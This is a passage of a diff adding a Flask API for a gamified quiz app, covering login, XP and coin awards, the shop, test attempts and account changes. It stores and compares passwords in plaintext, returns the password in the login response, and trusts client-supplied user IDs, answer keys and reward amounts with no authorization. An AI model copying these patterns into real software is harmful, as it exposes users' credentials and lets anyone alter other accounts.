+    return jsonify(user), 200
+
+@api_bp.route('/user', methods=['POST'])
+def register_user():
+    """
+    Registration: /api/user
+    Expects {username, email, password, confirmPassword} in JSON
+    Calls create_user, returns {message, user_id} or error.
+    """
+    user_data = request.json or {}
+    try:
+        user_data.setdefault("achievement_counters", {
+            "total_tests_completed": 0,
+            "perfect_tests_count": 0,
+            "perfect_tests_by_category": {},
+            "highest_score_ever": 0.0,
+            "lowest_score_ever": 100.0,
+            "total_questions_answered": 0,
+        })
+
+        start_db = time.time()
+        user_id = create_user(user_data)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        return jsonify({"message": "User created", "user_id": str(user_id)}), 201
+    except ValueError as ve:
+        return jsonify({"error": str(ve)}), 400
+    except Exception as e:
+        return jsonify({"error": "Internal server error", "details": str(e)}), 500
+
+@api_bp.route('/login', methods=['POST'])
+def login():
+    data = request.json
+    if not data:
+        start_db = time.time()
+        db.auditLogs.insert_one({
+            "timestamp": datetime.utcnow(),
+            "userId": None,
+            "ip": request.remote_addr or "unknown",
+            "success": False,
+            "reason": "No JSON data provided"
+        })
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        return jsonify({"error": "No JSON data provided"}), 400
+
+    identifier = data.get("usernameOrEmail")
+    password = data.get("password")
+    if not identifier or not password:
+        start_db = time.time()
+        db.auditLogs.insert_one({
+            "timestamp": datetime.utcnow(),
+            "userId": None,
+            "ip": request.remote_addr or "unknown",
+            "success": False,
+            "reason": "Missing username/password"
+        })
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        return jsonify({"error": "Username (or Email) and password are required"}), 400
+
+    start_db = time.time()
+    user = get_user_by_identifier(identifier)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user or user.get("password") != password:
+        start_db = time.time()
+        db.auditLogs.insert_one({
+            "timestamp": datetime.utcnow(),
+            "userId": None,
+            "ip": request.remote_addr or "unknown",
+            "success": False,
+            "reason": "Invalid username or password"
+        })
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        return jsonify({"error": "Invalid username or password"}), 401
+
+    session['userId'] = str(user["_id"])
+
+    start_db = time.time()
+    db.auditLogs.insert_one({
+        "timestamp": datetime.utcnow(),
+        "userId": user["_id"],
+        "ip": request.remote_addr or "unknown",
+        "success": True
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    user = serialize_user(user)
+
+    return jsonify({
+        "user_id": user["_id"],
+        "username": user["username"],
+        "email": user.get("email", ""),
+        "coins": user.get("coins", 0),
+        "xp": user.get("xp", 0),
+        "level": user.get("level", 1),
+        "achievements": user.get("achievements", []),
+        "xpBoost": user.get("xpBoost", 1.0),
+        "currentAvatar": user.get("currentAvatar"),
+        "nameColor": user.get("nameColor"),
+        "purchasedItems": user.get("purchasedItems", []),
+        "subscriptionActive": user.get("subscriptionActive", False),
+        "password": user.get("password")
+    }), 200
+
+@api_bp.route('/user/<user_id>/add-xp', methods=['POST'])
+def add_xp_route(user_id):
+    data = request.json or {}
+    xp_to_add = data.get("xp", 0)
+
+    start_db = time.time()
+    updated = update_user_xp(user_id, xp_to_add)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not updated:
+        return jsonify({"error": "User not found"}), 404
+
+    start_db = time.time()
+    new_achievements = check_and_unlock_achievements(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    updated["newAchievements"] = new_achievements
+    return jsonify(updated), 200
+
+@api_bp.route('/user/<user_id>/add-coins', methods=['POST'])
+def add_coins_route(user_id):
+    data = request.json or {}
+    coins_to_add = data.get("coins", 0)
+
+    start_db = time.time()
+    update_user_coins(user_id, coins_to_add)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    start_db = time.time()
+    newly_unlocked = check_and_unlock_achievements(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({
+        "message": "Coins updated",
+        "newlyUnlocked": newly_unlocked
+    }), 200
+
+# -------------------------------------------------------------------
+# SHOP ROUTES
+# -------------------------------------------------------------------
+@api_bp.route('/shop', methods=['GET'])
+def fetch_shop():
+    start_db = time.time()
+    items = get_shop_items()
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    for item in items:
+        item["_id"] = str(item["_id"])
+    return jsonify(items), 200
+
+@api_bp.route('/shop/purchase/<item_id>', methods=['POST'])
+def purchase_item_route(item_id):
+    data = request.json or {}
+    user_id = data.get("userId")
+    if not user_id:
+        return jsonify({"success": False, "message": "userId is required"}), 400
+
+    start_db = time.time()
+    result = purchase_item(user_id, item_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if result["success"]:
+        start_db = time.time()
+        newly_unlocked = check_and_unlock_achievements(user_id)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        result["newly_unlocked"] = newly_unlocked
+        return jsonify(result), 200
+    else:
+        return jsonify(result), 400
+
+@api_bp.route('/shop/equip', methods=['POST'])
+def equip_item_route():
+    data = request.json or {}
+    user_id = data.get("userId")
+    item_id = data.get("itemId")
+
+    if not user_id or not item_id:
+        return jsonify({"success": False, "message": "userId and itemId are required"}), 400
+
+    start_db = time.time()
+    user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user:
+        return jsonify({"success": False, "message": "User not found"}), 404
+
+    try:
+        oid = ObjectId(item_id)
+    except Exception:
+        return jsonify({"success": False, "message": "Invalid item ID"}), 400
+
+    start_db = time.time()
+    item_doc = shop_collection.find_one({"_id": oid})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not item_doc:
+        return jsonify({"success": False, "message": "Item not found in shop"}), 404
+
+    if oid not in user.get("purchasedItems", []):
+        if user.get("level", 1) < item_doc.get("unlockLevel", 1):
+            return jsonify({"success": False, "message": "Item not unlocked"}), 400
+
+    start_db = time.time()
+    mainusers_collection.update_one(
+        {"_id": user["_id"]},
+        {"$set": {"currentAvatar": oid}}
+    )
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({"success": True, "message": "Avatar equipped"}), 200
+
+# -------------------------------------------------------------------
+# TESTS ROUTES
+# -------------------------------------------------------------------
+@api_bp.route('/tests/<test_id>', methods=['GET'])
+def fetch_test_by_id_route(test_id):
+    start_db = time.time()
+    test_doc = get_test_by_id_and_category(test_id, None)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not test_doc:
+        return jsonify({"error": "Test not found"}), 404
+    test_doc["_id"] = str(test_doc["_id"])
+    return jsonify(test_doc), 200
+
+@api_bp.route('/tests/<category>/<test_id>', methods=['GET'])
+def fetch_test_by_category_and_id(category, test_id):
+    try:
+        test_id_int = int(test_id)
+    except Exception:
+        return jsonify({"error": "Invalid test ID"}), 400
+
+    start_db = time.time()
+    test_doc = tests_collection.find_one({
+        "testId": test_id_int,
+        "category": category
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not test_doc:
+        return jsonify({"error": "Test not found"}), 404
+
+    test_doc["_id"] = str(test_doc["_id"])
+    return jsonify(test_doc), 200
+
+# -------------------------------------------------------------------
+# PROGRESS / ATTEMPTS ROUTES
+# -------------------------------------------------------------------
+@api_bp.route('/attempts/<user_id>/<test_id>', methods=['GET'])
+def get_test_attempt(user_id, test_id):
+    try:
+        user_oid = ObjectId(user_id)
+        try:
+            test_id_int = int(test_id)
+        except:
+            test_id_int = None
+    except:
+        return jsonify({"error": "Invalid user ID or test ID"}), 400
+
+    query = {"userId": user_oid, "finished": False}
+    if test_id_int is not None:
+        query["$or"] = [{"testId": test_id_int}, {"testId": test_id}]
+    else:
+        query["testId"] = test_id
+
+    start_db = time.time()
+    attempt = testAttempts_collection.find_one(query)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not attempt:
+        query_finished = {"userId": user_oid, "finished": True}
+        if test_id_int is not None:
+            query_finished["$or"] = [{"testId": test_id_int}, {"testId": test_id}]
+        else:
+            query_finished["testId"] = test_id
+
+        start_db = time.time()
+        attempt = testAttempts_collection.find_one(query_finished, sort=[("finishedAt", -1)])
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+    if not attempt:
+        return jsonify({"attempt": None}), 200
+
+    attempt["_id"] = str(attempt["_id"])
+    attempt["userId"] = str(attempt["userId"])
+    return jsonify({"attempt": attempt}), 200
+
+@api_bp.route('/attempts/<user_id>/<test_id>', methods=['POST'])
+def update_test_attempt(user_id, test_id):
+    data = request.json or {}
+    try:
+        user_oid = ObjectId(user_id)
+        try:
+            test_id_int = int(test_id)
+        except:
+            test_id_int = test_id
+    except:
+        return jsonify({"error": "Invalid user ID or test ID"}), 400
+
+    exam_mode_val = data.get("examMode", False)
+    selected_length = data.get("selectedLength", data.get("totalQuestions", 0))
+
+    filter_ = {
+        "userId": user_oid,
+        "$or": [{"testId": test_id_int}, {"testId": test_id}]
+    }
+    update_doc = {
+        "$set": {
+            "userId": user_oid,
+            "testId": test_id_int if isinstance(test_id_int, int) else test_id,
+            "category": data.get("category", "global"),
+            "answers": data.get("answers", []),
+            "score": data.get("score", 0),
+            "totalQuestions": data.get("totalQuestions", 0),
+            "selectedLength": selected_length,
+            "currentQuestionIndex": data.get("currentQuestionIndex", 0),
+            "shuffleOrder": data.get("shuffleOrder", []),
+            "answerOrder": data.get("answerOrder", []),
+            "finished": data.get("finished", False),
+            "examMode": exam_mode_val
+        }
+    }
+    if update_doc["$set"]["finished"] is True:
+        update_doc["$set"]["finishedAt"] = datetime.utcnow()
+
+    start_db = time.time()
+    testAttempts_collection.update_one(filter_, update_doc, upsert=True)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({
+        "message": "Progress updated (examMode=%s, selectedLength=%s)" % (exam_mode_val, selected_length)
+    }), 200
+
+@api_bp.route('/attempts/<user_id>/<test_id>/finish', methods=['POST'])
+def finish_test_attempt(user_id, test_id):
+    data = request.json or {}
+    try:
+        user_oid = ObjectId(user_id)
+        try:
+            test_id_int = int(test_id)
+        except:
+            test_id_int = test_id
+    except:
+        return jsonify({"error": "Invalid user ID or test ID"}), 400
+
+    filter_ = {
+        "userId": user_oid,
+        "finished": False,
+        "$or": [{"testId": test_id_int}, {"testId": test_id}]
+    }
+    update_doc = {
+        "$set": {
+            "finished": True,
+            "finishedAt": datetime.utcnow(),
+            "score": data.get("score", 0),
+            "totalQuestions": data.get("totalQuestions", 0)
+        }
+    }
+
+    start_db = time.time()
+    testAttempts_collection.update_one(filter_, update_doc)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    start_db = time.time()
+    attempt_doc = testAttempts_collection.find_one({
+        "userId": user_oid,
+        "$or": [{"testId": test_id_int}, {"testId": test_id}],
+        "finished": True
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not attempt_doc:
+        return jsonify({"error": "Attempt not found after finishing."}), 404
+
+    exam_mode = attempt_doc.get("examMode", False)
+    selected_length = attempt_doc.get("selectedLength", attempt_doc.get("totalQuestions", 0))
+    score = attempt_doc.get("score", 0)
+    total_questions = attempt_doc.get("totalQuestions", 0)
+    category = attempt_doc.get("category", "global")
+
+    if exam_mode:
+        start_db = time.time()
+        award_correct_answers_in_bulk(
+            user_id=user_id,
+            attempt_doc=attempt_doc,
+            xp_per_correct=10,
+            coins_per_correct=5
+        )
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+    start_db = time.time()
+    user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user:
+        return jsonify({"error": "User not found"}), 404
+
+    counters = user.get("achievement_counters", {})
+    percentage = 0
+    if total_questions > 0:
+        percentage = (score / total_questions) * 100
+
+    update_ops = {"$inc": {"achievement_counters.total_tests_completed": 1}}
+
+    if score == total_questions and total_questions > 0 and selected_length == 100:
+        update_ops["$inc"]["achievement_counters.perfect_tests_count"] = 1
+        catKey = f"achievement_counters.perfect_tests_by_category.{category}"
+        update_ops["$inc"][catKey] = 1
+
+    if selected_length == 100:
+        highest_so_far = counters.get("highest_score_ever", 0.0)
+        lowest_so_far = counters.get("lowest_score_ever", 100.0)
+        set_ops = {}
+        if percentage > highest_so_far:
+            set_ops["achievement_counters.highest_score_ever"] = percentage
+        if percentage < lowest_so_far:
+            set_ops["achievement_counters.lowest_score_ever"] = percentage
+        if set_ops:
+            update_ops.setdefault("$set", {}).update(set_ops)
+
+    actual_answered_count = sum(1 for ans in attempt_doc.get("answers", []) 
+                              if ans.get("userAnswerIndex") is not None)
+    update_ops["$inc"]["achievement_counters.total_questions_answered"] = actual_answered_count
+
+    start_db = time.time()
+    mainusers_collection.update_one({"_id": user_oid}, update_ops)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    start_db = time.time()
+    newly_unlocked = check_and_unlock_achievements(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    start_db = time.time()
+    updated_user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({
+        "message": "Test attempt finished",
+        "examMode": exam_mode,
+        "selectedLength": selected_length,
+        "newlyUnlocked": newly_unlocked,
+        "newXP": updated_user.get("xp", 0),
+        "newCoins": updated_user.get("coins", 0)
+    }), 200
+
+@api_bp.route('/attempts/<user_id>/list', methods=['GET'])
+def list_test_attempts(user_id):
+    try:
+        user_oid = ObjectId(user_id)
+    except:
+        return jsonify({"error": "Invalid user ID"}), 400
+
+    page = request.args.get("page", default=1, type=int)
+    page_size = request.args.get("page_size", default=50, type=int)
+    skip_count = (page - 1) * page_size
+
+    start_db = time.time()
+    cursor = testAttempts_collection.find(
+        {"userId": user_oid}
+    ).sort("finishedAt", -1).skip(skip_count).limit(page_size)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    attempts = []
+    for doc in cursor:
+        doc["_id"] = str(doc["_id"])
+        doc["userId"] = str(doc["userId"])
+        attempts.append(doc)
+
+    return jsonify({
+        "page": page,
+        "page_size": page_size,
+        "attempts": attempts
+    }), 200
+
+# -------------------------------------------------------------------
+# FIRST-TIME-CORRECT ANSWERS
+# -------------------------------------------------------------------
+@api_bp.route('/user/<user_id>/submit-answer', methods=['POST'])
+def submit_answer(user_id):
+    data = request.json or {}
+    test_id = str(data.get("testId"))
+    question_id = data.get("questionId")
+    selected_index = data.get("selectedIndex")
+    correct_index = data.get("correctAnswerIndex")
+    xp_per_correct = data.get("xpPerCorrect", 10)
+    coins_per_correct = data.get("coinsPerCorrect", 5)
+
+    start_db = time.time()
+    user = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user:
+        return jsonify({"error": "User not found"}), 404
+
+    start_db = time.time()
+    attempt_doc = testAttempts_collection.find_one({
+        "userId": user["_id"],
+        "finished": False,
+        "$or": [
+            {"testId": int(test_id)} if test_id.isdigit() else {"testId": test_id},
+            {"testId": test_id}
+        ]
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not attempt_doc:
+        return jsonify({"error": "No unfinished attempt doc found"}), 404
+
+    exam_mode = attempt_doc.get("examMode", False)
+    is_correct = (selected_index == correct_index)
+
+    existing_answer_index = None
+    for i, ans in enumerate(attempt_doc.get("answers", [])):
+        if ans.get("questionId") == question_id:
+            existing_answer_index = i
+            break
+
+    new_score = attempt_doc.get("score", 0)
+    if existing_answer_index is not None:
+        update_payload = {
+            "answers.$.userAnswerIndex": selected_index,
+            "answers.$.correctAnswerIndex": correct_index
+        }
+        if exam_mode is False and is_correct:
+            new_score += 1
+            update_payload["score"] = new_score
+
+        start_db = time.time()
+        testAttempts_collection.update_one(
+            {
+                "_id": attempt_doc["_id"],
+                "answers.questionId": question_id
+            },
+            {"$set": update_payload}
+        )
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+    else:
+        new_answer_doc = {
+            "questionId": question_id,
+            "userAnswerIndex": selected_index,
+            "correctAnswerIndex": correct_index
+        }
+        if exam_mode is False and is_correct:
+            new_score += 1
+        push_update = {"$push": {"answers": new_answer_doc}}
+        if exam_mode is False and is_correct:
+            push_update["$set"] = {"score": new_score}
+
+        start_db = time.time()
+        testAttempts_collection.update_one(
+            {"_id": attempt_doc["_id"]},
+            push_update
+        )
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+    awarded_xp = 0
+    awarded_coins = 0
+    if exam_mode is False:
+        start_db = time.time()
+        already_correct = correctAnswers_collection.find_one({
+            "userId": user["_id"],
+            "testId": test_id,
+            "questionId": question_id
+        })
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        if is_correct and not already_correct:
+            start_db = time.time()
+            correctAnswers_collection.insert_one({
+                "userId": user["_id"],
+                "testId": test_id,
+                "questionId": question_id
+            })
+            duration = time.time() - start_db
+            if not hasattr(g, 'db_time_accumulator'):
+                g.db_time_accumulator = 0.0
+            g.db_time_accumulator += duration
+
+            start_db = time.time()
+            update_user_xp(user_id, xp_per_correct)
+            duration2 = time.time() - start_db
+            if not hasattr(g, 'db_time_accumulator'):
+                g.db_time_accumulator = 0.0
+            g.db_time_accumulator += duration2
+
+            start_db = time.time()
+            update_user_coins(user_id, coins_per_correct)
+            duration3 = time.time() - start_db
+            if not hasattr(g, 'db_time_accumulator'):
+                g.db_time_accumulator = 0.0
+            g.db_time_accumulator += duration3
+
+            awarded_xp = xp_per_correct
+            awarded_coins = coins_per_correct
+
+        start_db = time.time()
+        updated_user = get_user_by_id(user_id)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        return jsonify({
+            "examMode": False,
+            "isCorrect": is_correct,
+            "alreadyCorrect": bool(already_correct),
+            "awardedXP": awarded_xp,
+            "awardedCoins": awarded_coins,
+            "newXP": updated_user.get("xp", 0),
+            "newCoins": updated_user.get("coins", 0)
+        }), 200
+    else:
+        return jsonify({
+            "examMode": True,
+            "message": "Answer stored. No immediate feedback in exam mode."
+        }), 200
+
+# -------------------------------------------------------------------
+# ACHIEVEMENTS
+# -------------------------------------------------------------------
+@api_bp.route('/achievements', methods=['GET'])
+def fetch_achievements_route():
+    start_db = time.time()
+    ach_list = list(achievements_collection.find({}))
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    for ach in ach_list:
+        ach["_id"] = str(ach["_id"])
+    return jsonify(ach_list), 200
+
+# -------------------------------------------------------------------
+# Leaderboard Route with Lazy Loading & Pagination
+# -------------------------------------------------------------------
+@api_bp.route('/leaderboard', methods=['GET'])
+def get_leaderboard():
+    global leaderboard_cache
+    global leaderboard_cache_timestamp
+
+    now_ms = int(time.time() * 1000)
+    if now_ms - leaderboard_cache_timestamp > LEADERBOARD_CACHE_DURATION_MS:
+        start_db = time.time()
+        cursor = mainusers_collection.find(
+            {},
+            {"username": 1, "level": 1, "xp": 1, "currentAvatar": 1}
+        ).sort("level", -1).limit(1000)
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+        new_results = []
+        rank = 1
+        for user in cursor:
+            user_data = {
+                "username": user.get("username", "unknown"),
+                "level": user.get("level", 1),
+                "xp": user.get("xp", 0),
+                "rank": rank,
+                "avatarUrl": None
+            }
+            if user.get("currentAvatar"):
+                start_db = time.time()
+                avatar_item = shop_collection.find_one({"_id": user["currentAvatar"]})
+                duration = time.time() - start_db
+                if not hasattr(g, 'db_time_accumulator'):
+                    g.db_time_accumulator = 0.0
+                g.db_time_accumulator += duration
+
+                if avatar_item and "imageUrl" in avatar_item:
+                    user_data["avatarUrl"] = avatar_item["imageUrl"]
+            new_results.append(user_data)
+            rank += 1
+
+        leaderboard_cache = new_results
+        leaderboard_cache_timestamp = now_ms
+
+    try:
+        skip = int(request.args.get("skip", 0))
+        limit = int(request.args.get("limit", 50))
+    except:
+        skip, limit = 0, 50
+
+    total_entries = len(leaderboard_cache)
+    end_index = skip + limit
+    if skip > total_entries:
+        sliced_data = []
+    else:
+        sliced_data = leaderboard_cache[skip:end_index]
+
+    return jsonify({
+        "data": sliced_data,
+        "total": total_entries
+    }), 200
+
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+# USERNAME/EMAIL/PASSWORD CHANGES
+# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+@api_bp.route('/user/change-username', methods=['POST'])
+def change_username():
+    data = request.json or {}
+    user_id = data.get("userId")
+    new_username = data.get("newUsername")
+    if not user_id or not new_username:
+        return jsonify({"error": "Missing userId or newUsername"}), 400
+
+    valid, errors = validate_username(new_username)
+    if not valid:
+        return jsonify({"error": "Invalid new username", "details": errors}), 400
+
+    start_db = time.time()
+    existing = mainusers_collection.find_one({"username": new_username})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if existing:
+        return jsonify({"error": "Username already taken"}), 400
+
+    start_db = time.time()
+    doc = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not doc:
+        return jsonify({"error": "User not found"}), 404
+
+    start_db = time.time()
+    update_user_fields(user_id, {"username": new_username})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({"message": "Username updated"}), 200
+
+@api_bp.route('/user/change-email', methods=['POST'])
+def change_email():
+    data = request.json or {}
+    user_id = data.get("userId")
+    new_email = data.get("newEmail")
+    if not user_id or not new_email:
+        return jsonify({"error": "Missing userId or newEmail"}), 400
+
+    valid, errors = validate_email(new_email)
+    if not valid:
+        return jsonify({"error": "Invalid email", "details": errors}), 400
+
+    start_db = time.time()
+    existing = mainusers_collection.find_one({"email": new_email})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if existing:
+        return jsonify({"error": "Email already in use"}), 400
+
+    start_db = time.time()
+    doc = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not doc:
+        return jsonify({"error": "User not found"}), 404
+
+    start_db = time.time()
+    update_user_fields(user_id, {"email": new_email})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({"message": "Email updated"}), 200
+
+@api_bp.route('/user/change-password', methods=['POST'])
+def change_password():
+    data = request.json or {}
+    user_id = data.get("userId")
+    old_password = data.get("oldPassword")
+    new_password = data.get("newPassword")
+    confirm = data.get("confirmPassword")
+
+    if not user_id or not old_password or not new_password or not confirm:
+        return jsonify({"error": "All fields are required"}), 400
+    if new_password != confirm:
+        return jsonify({"error": "New passwords do not match"}), 400
+
+    valid, errors = validate_password(new_password)
+    if not valid:
+        return jsonify({"error": "Invalid new password", "details": errors}), 400
+
+    start_db = time.time()
+    user_doc = get_user_by_id(user_id)
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not user_doc:
+        return jsonify({"error": "User not found"}), 404
+
+    if user_doc.get("password") != old_password:
+        return jsonify({"error": "Old password is incorrect"}), 401
+
+    start_db = time.time()
+    update_user_fields(user_id, {"password": new_password})
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    return jsonify({"message": "Password updated"}), 200
+
+@api_bp.route('/subscription/cancel', methods=['POST'])
+def cancel_subscription():
+    return jsonify({"message": "Cancel subscription placeholder"}), 200
+
+# For single answer updates
+@api_bp.route('/attempts/<user_id>/<test_id>/answer', methods=['POST'])
+def update_single_answer(user_id, test_id):
+    data = request.json or {}
+    question_id = data.get("questionId")
+    user_answer_index = data.get("userAnswerIndex")
+    correct_answer_index = data.get("correctAnswerIndex")
+
+    try:
+        user_oid = ObjectId(user_id)
+        test_id_int = int(test_id) if test_id.isdigit() else test_id
+    except:
+        return jsonify({"error": "Invalid user ID or test ID"}), 400
+
+    start_db = time.time()
+    attempt = testAttempts_collection.find_one({
+        "userId": user_oid,
+        "finished": False,
+        "$or": [{"testId": test_id_int}, {"testId": test_id}]
+    })
+    duration = time.time() - start_db
+    if not hasattr(g, 'db_time_accumulator'):
+        g.db_time_accumulator = 0.0
+    g.db_time_accumulator += duration
+
+    if not attempt:
+        return jsonify({"error": "Attempt not found"}), 404
+
+    existing_answer_index = None
+    for i, ans in enumerate(attempt.get("answers", [])):
+        if ans.get("questionId") == question_id:
+            existing_answer_index = i
+            break
+
+    if existing_answer_index is not None:
+        start_db = time.time()
+        testAttempts_collection.update_one(
+            {
+                "userId": user_oid,
+                "finished": False,
+                "$or": [{"testId": test_id_int}, {"testId": test_id}],
+                "answers.questionId": question_id
+            },
+            {"$set": {
+                "answers.$.userAnswerIndex": user_answer_index,
+                "answers.$.correctAnswerIndex": correct_answer_index,
+                "score": data.get("score", 0)
+            }}
+        )
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+    else:
+        start_db = time.time()
+        testAttempts_collection.update_one(
+            {
+                "userId": user_oid,
+                "finished": False,
+                "$or": [{"testId": test_id_int}, {"testId": test_id}]
+            },
+            {
+                "$push": {
+                    "answers": {
+                        "questionId": question_id,
+                        "userAnswerIndex": user_answer_index,
+                        "correctAnswerIndex": correct_answer_index
+                    }
+                },
+                "$set": {"score": data.get("score", 0)}
+            }
+        )
+        duration = time.time() - start_db
+        if not hasattr(g, 'db_time_accumulator'):
+            g.db_time_accumulator = 0.0
+        g.db_time_accumulator += duration
+
+    return jsonify({"message": "Answer updated"}), 200
+
+# For updating the current question position only
+@api_bp.route('/attempts/<user_id>/<test_id>/position', methods=['POST'])
+def update_position(user_id, test_id):
+    data = request.json or {}
+    current_index = data.get("currentQuestionIndex", 0)
+
+    try:
+        user_oid = ObjectId(user_id)
+        test_id_int = int(test_id) if test_id.isdigit() else test_id
+    except:
+        return jsonify({"error": "Invalid user ID or test ID"}), 400
+
+    start_db = time.time()
+    testAttempts_collection.update_one(
+        {
+            "userId": user_oid,
+            "finished": False,
+            "$or": [{"testId": test_id_int}, {"testId": test_id}]
+        },
+        {"$set": {
